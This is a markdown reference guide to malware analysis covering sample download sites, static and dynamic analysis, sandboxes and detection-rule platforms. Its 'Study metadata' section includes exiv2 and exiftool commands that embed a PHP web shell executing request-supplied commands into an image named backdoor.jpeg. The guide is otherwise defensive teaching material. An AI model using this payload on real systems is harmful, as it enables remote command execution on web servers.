# Malware analysis

Malware analysis is the process of examining malicious software (malware) to understand its functionality, origin, and potential impact on systems and networks. 


## Malware sample downloads  

Entering a simple google search "malware sample download" results in outputs of platforms to get downloadable malware samples.

**Popular platforms**

- [Any.run Malware trends](https://any.run/malware-trends/)

- [Malware bazaar](http://bazaar.abuse.ch)  

- [The Zoo](https://github.com/ytisf/theZoo)  

- [Mal share](http://malshare.com)  

- [Mal source](https://github.com/0xjet/malsource)

- [Malware samples](https://github.com/RamadhanAmizudin/malware)

- [Malware-traffic-analysis](https://malware-traffic-analysis.net/)

- [Virus exchange](https://virus.exchange/)

- [Virus share](http://virusshare.com)  

- [Vx-underground Samples](https://vx-underground.org/Samples)  



‚ö†Ô∏èTest the samples inside a controlled environment.



## Virtualization environment troubleshoots

- On the host, ensure firewall rules allow QEMU‚Äôs user-mode NAT traffic.
- If you use security features like SELinux or AppArmor, verify they are not restricting VMs network access.
- Ensure no conflicting DHCP
- Use NAT to safely isolates the VM behind the host‚Äôs network stack.


# Malware analysis techniques

- Static analysis
- Dynamic analysis
- Code analysis/Reverse engineering

## 1. Static analysis¬†  

Static analysis is the process of inspecting a malicious program without executing it.  

Techniques include inspecting file headers, strings, disassembly, and code structure.
  

### Search for known signatures

- [CyberChef](https://gchq.github.io/CyberChef/#)  

- [URLvoid](http://urlvoid.com)  

- [Virustotal.](http://virustotal.com)  

- [ID-Ransomware Malware hunter team](https://id-ransomware.malwarehunterteam.com/)  

  

  
### File analysis

To get the file type, hash¬†etc

**File type**

```bash
file -b -s <filename>
```


**File hash**

- [MD5 hash calculator](https://md5-hash.calculator.zone/)

On Linux
```bash
md5sum [file-name]

sha256sum [file-name]

sha1sum [filename] # shasum [file-name]
```

On Windows

```bash
Get-FileHash -Path "filename" -Algorithm SHA1
```

Cross-platform

- [hash triage python script](https://github.com/80h3m14n/blue-team-tools/blob/main/scripts/malware-analysis/malware-hash-triage.py)

The file hash can be used to search online to find similar samples

  
### Strings Analysis
IP address, embedded filenames, API functions, command line arguments, registry path/key

  
```bash
strings [file-name]
```
  

### Study metadata

Inject PHP into JPEG

```bash
#1. Exiv2
exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' backdoor.jpeg

# 2 Exiftool
exiftool ‚Äú-comment<=back.php‚Äù back.png
```

Check file metadata

```bash
stat <filename>

exiftool <filename>
```

On Ms windows, you can check metadata using GUI, right-click on the file and select `Properties`


### Shannon Entropy Analysis

Shannon entropy is a fundamental concept in information theory that quantifies the uncertainty or information content in a random variable or data source

$$H = -\sum p(x) \log_2 p(x)$$

| bits/byte range | Meaning |
|---------------|---------|
| 0‚Äì2 | Highly structured/predictable data |
| 2‚Äì6 | Typical compressed or mixed data |
| 7‚Äì8 | Random or encrypted data |
| 8   | Maximum randomness |

High entropy often indicates packed/encrypted malware or compressed payloads worth investigating further.

**NOTE:** Some files i.e PNG files are already compressed using DEFLATE/Lossless/LZ77 and Huffman coding making them have a high entropy value.

| File Type             | Typical Entropy |
| --------------------- | --------------- |
| Plain text (.txt)     | 4.0 ‚Äì 5.5       |
| Source code           | 4.5 ‚Äì 6.0       |
| Executable (unpacked) | 6.0 ‚Äì 7.2       |
| PNG / JPEG            | 7.7 ‚Äì 8.0       |
| ZIP / RAR             | 7.8 ‚Äì 8.0       |
| Encrypted file        | 7.99 ‚Äì 8.00     |




- [Entropy scanner script](https://github.com/80h3m14n/blue-team-tools/blob/main/scripts/malware-analysis/entropy.py)



### Binary data

- Imports, exports & dependencies
- Hexadecimal
- Signatures
- Header files
- Sections


Use tools like

- Ghidra
- IDA
- [Exeinfo PE](https://github.com/ExeinfoASL/ASL)
- [PEstudio](https://www.winitor.com/download)
- [HxD hex editor](https://mh-nexus.de/en/hxd/)
- CFF explorer

&nbsp;


## 2. Dynamic (behavioral) analysis¬†  

Process of inspecting a malicious program by running it under a controlled environment.  

Behavior analysis involves launching the malware sample being analyzed and examining activities performed by it, such as reading or writing files or performing network communications.


- Track registry changes
- Monitoring network traffic¬†
- Monitoring system calls¬†
- Monitoring file system modifications¬†


### Lab setup

| Category | tools |
|----------|-------|
| Networking support | - VPN <br> - TOR <br> - Wireshark <br> - ApateDNS <br> - Netcat <br> - INeTSim |
| malware analysis workstation | - REMnux |
| Isolated environment | - Sandbox <br> - Virtual machines |
| Intergrations | - YARA Rules |
| Microsoft system internals | - Process monitor <br> - Process explorer <br> - Regshot¬†  <br> - Autorun |




### Malware sandboxing¬†  

Sandboxes allow running applications in an environment isolating them from the rest of your system to prevent potential security risks. 

This provides a safe and secure way to run applications, reducing the risk of malware and other security threats.

***Cloud Sandboxes (automated, easy access)***

-  [Analyze.intezer](http://www.analyze.intezer.com)  
-  [Any.run](http://www.any.run)  
-  [Hybrid-analysis.com](http://www.hybrid-analysis.com) 
-  [Joe Sandbox](http://www.joesandbox.com)  
-  [Kunai web sandbox](https://sandbox.kunai.rocks)
-  [Sandbox.analyz.io](http://www.sandbox.analyz.io)  



***Local Sandboxes / VMs (you control the lab)***

- [Cuckoosandbox](http://www.cuckoosandbox.org)  
- [Flare-vm](https://github.com/fireeye/flare-vm)  
- [Firejail](https://github.com/netblue30/firejail)
- [Remnux.org](http://remnux.org )  
- Microsoft Windows sandbox  


**Deprecated Sandboxes**

- ThreatExpert  
- Bitblaze  
- GFI sandbox  
- Anubis  
- Norman sandbox  
- Comodo Instant Malware Analysis¬†


&nbsp;


## 3. Code analysis/reverse engineering

Code analysis is the most time-consuming type of analysis used to obtain an accurate description of a malware‚Äôs code, typically by examining it with reverse engineering instruments.

Dig deep into the malware code to understand it's logic, functions, algorithms and techniques¬†

**Techniques**

- Disassembling
- Debugging
- Decompiling
- Malware unpacking¬†


&nbsp;



# Malware detection techniques

Detection rules are logical constructs used by security systems to identify potential threats, malicious activities, or policy violations. 

Security professionals share detection rules across platforms to address the latest CVEs and emerging threats.


## Common detection rule platforms

- [YARA rules](https://github.com/VirusTotal/yara/)

- [Sigma rules](https://github.com/SigmaHQ/sigma) 

- [Snort rules](https://www.snort.org/downloads/#rule-downloads)

- [SOC prime](https://tdm.socprime.com/) 

- [Suricata rules](https://github.com/OISF/suricata)

- [Zeek framework](https://github.com/zeek/zeek/tree/master)



&nbsp;


# Resources
  
## Books  

-  [Malware Bible](https://bible.malcore.io/)  

## Websites/blogs

- [MITRE ATT&CK](https://attack.mitre.org/tactics/)


üïµÔ∏è‚Äç‚ôÇÔ∏è ‚ÄúStay alert, stay patched.‚Äù

